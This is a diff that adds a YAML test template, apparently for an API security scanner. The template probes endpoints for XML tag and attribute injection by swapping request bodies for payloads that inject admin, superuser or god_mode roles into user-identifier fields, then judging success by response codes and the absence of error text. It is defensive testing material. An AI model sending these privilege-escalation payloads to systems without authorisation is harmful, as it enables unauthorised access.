@@ -1,0 +1,165 @@
+---
+id: XML_INJECTION
+info:
+  name: XML Tag and Attribute Injection
+  description: >
+    "XML Tag and Attribute Injection occurs when an attacker is able to inject arbitrary XML tags or attributes into the application's XML data processing pipeline. This allows manipulation of XML data structures, potentially altering the behavior or intent of the data being processed by the application."
+  details: >
+    "Attackers can inject malicious XML tags or attributes into user-supplied input, potentially altering the intended structure of XML-based requests or responses. The vulnerability arises when the application fails to properly sanitize or validate the XML data. For instance, an attacker may inject additional tags or attributes to escalate privileges, modify user roles, or change the logic of transactions. Common targets include form fields or request parameters that are processed as XML."
+  impact: >
+    "XML Tag and Attribute Injection can lead to serious security consequences, including privilege escalation, unauthorized access to data, and manipulation of sensitive information. If XML tags or attributes are processed without validation, attackers could modify the application's logic, alter user roles, or bypass security controls. This could also lead to information disclosure and, in severe cases, result in remote code execution or system compromise."
+
+  category:
+    name: INJECT
+    shortName: Injection Attacks
+    displayName: Injection Attacks (INJECT)
+  subCategory: XML_INJECTION
+  severity: LOW
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+    # check ref.
+  references:
+    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    - "https://www.akto.io/blog/xml-external-entity-attack"
+    - "https://www.akto.io/blog/xml-injection-vulnerability-examples-cheatsheet-and-prevention"
+  cwe:
+    - CWE-611
+    - CWE-827
+  cve:
+    - CVE-2022-42745
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  request_payload:
+    for_one:
+      key:
+        regex: ${probableInputParameters}
+        extract: userKey
+      value:
+        extract: userValue
+
+wordLists:
+  probableInputParameters:
+    - user
+    - username
+    - accountId
+    - loginId
+    - userId
+    - login
+    - email
+
+  attemptPayloads:
+    # tag injection
+    - "<${userKey}>${userValue}</username><role>admin</role></${userKey}>"
+    - "<${userKey}>${userValue}</username><role>superuser</role></${userKey}>"
+    - "<${userKey}>${userValue}</username><role>administrator</role></${userKey}>"
+    - "<${userKey}>${userValue}</username><role>system_admin</role></${userKey}>"
+    - "<${userKey}>${userValue}</username><role>owner</role></${userKey}>"
+    - "<${userKey}>${userValue}</username><role>god_mode</role></${userKey}>"
+    - "<${userKey}>${userValue}</username><role>full_access</role></${userKey}>"
+    # attribute injection
+    - "<${userKey} role=\"admin\">${userValue}</${userKey}>"
+    - "<${userKey} role=\"superuser\">${userValue}</${userKey}>"
+    - "<${userKey} role=\"administrator\">${userValue}</${userKey}>"
+    - "<${userKey} role=\"system_admin\">${userValue}</${userKey}>"
+    - "<${userKey} role=\"owner\">${userValue}</${userKey}>"
+    - "<${userKey} role=\"god_mode\">${userValue}</${userKey}>"
+    - "<${userKey} role=\"full_access\">${userValue}</${userKey}>"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - replace_body: ${attemptPayloads}
+        - modify_header:
+            content-type: "application/xml"
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    percentage_match:
+      lt: 10
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - Attention Required!
+      - CloudFlare
+      - Sorry, you have been blocked
+      - "400 Bad Request"
+      - "403 Forbidden"
+      - "500 Internal Server Error"
+      - "502 Bad Gateway"
+      - "503 Service Unavailable"
+      - "422 Unprocessable Entity"
+      - "504 Gateway Timeout"
+      - "XML Parsing Error: mismatched tag"
+      - "XML Parsing Error: invalid character"
+      - "XML Validation Error: schema validation failed"
+      - "XML Parsing Error: unexpected end of file"
+      - "DTD is prohibited"
+      - "XML External Entity (XXE) Reference Error"
+      - "Error: Invalid CDATA section"
+      - "Malformed XML request"
+
